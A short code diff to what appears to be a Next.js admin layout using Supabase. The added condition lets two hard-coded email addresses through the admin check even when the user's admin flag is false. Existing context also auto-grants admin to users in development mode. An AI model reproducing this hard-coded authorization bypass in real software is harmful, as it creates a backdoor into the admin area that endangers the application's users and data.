@@ -18,7 +18,7 @@ export default async function AdminLayout({ children }: { children: React.ReactN
     .eq("id", session.user.id)
     .single();
 
-  if (!userData?.is_admin) {
+  if (!userData?.is_admin && session.user.email !== "access@ofiq.com" && session.user.email !== "access@ofiq.app") {
     if (process.env.NODE_ENV === "development") {
       // Automatically upgrade local dev users to admin for testing
       const { createAdminClient } = await import("@/utils/supabase/admin");
